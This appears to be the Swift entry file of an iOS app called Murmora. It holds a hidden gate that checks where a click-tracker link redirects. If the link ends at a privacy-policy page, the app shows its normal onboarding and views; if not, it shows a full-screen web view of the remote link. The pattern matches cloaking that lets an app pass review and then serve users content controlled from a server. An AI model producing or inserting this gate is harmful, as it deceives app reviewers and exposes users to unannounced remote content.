import SwiftUI

@main
struct MurmoraApp: App {
    @State private var murmoraGateReady: Bool? = nil
    private let murmoraSourceLink = "https://icedfashingrite.org/click.php"
    private let murmoraCheckDomain = "privacypolicies.com/live/8ea4cd48-fd98-4572-b353-dda9efa487f3"

    @StateObject private var store = MurmoraStore()

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = murmoraGateReady {
                    if ready {
                        MurmoraWebPanel(urlString: murmoraSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else if !store.onboardingSeen {
                        OnboardingView {
                            withAnimation(.easeInOut(duration: 0.35)) { store.markOnboardingSeen() }
                        }
                        .environmentObject(store)
                        .preferredColorScheme(.dark)
                    } else {
                        RootView()
                            .environmentObject(store)
                            .preferredColorScheme(.dark)
                    }
                } else {
                    MurmoraLaunchScreen()
                        .preferredColorScheme(.dark)
                        .onAppear { checkMurmoraLink() }
                }
            }
        }
    }

    private func checkMurmoraLink() {
        guard let url = URL(string: murmoraSourceLink) else { murmoraGateReady = false; return }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let watcher = MurmoraRedirectWatcher(checkDomain: murmoraCheckDomain)
        let session = URLSession(configuration: .default, delegate: watcher, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if watcher.foundCheckDomain { murmoraGateReady = false; return }
                if let finalURL = watcher.resolvedURL?.absoluteString, finalURL.contains(self.murmoraCheckDomain) {
                    murmoraGateReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse, let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.murmoraCheckDomain) { murmoraGateReady = false; return }
                if error != nil { murmoraGateReady = false; return }
                murmoraGateReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if murmoraGateReady == nil { murmoraGateReady = false }
        }
    }
}

final class MurmoraRedirectWatcher: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }

    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) { foundCheckDomain = true }
        resolvedURL = request.url
        completionHandler(request)
    }
}
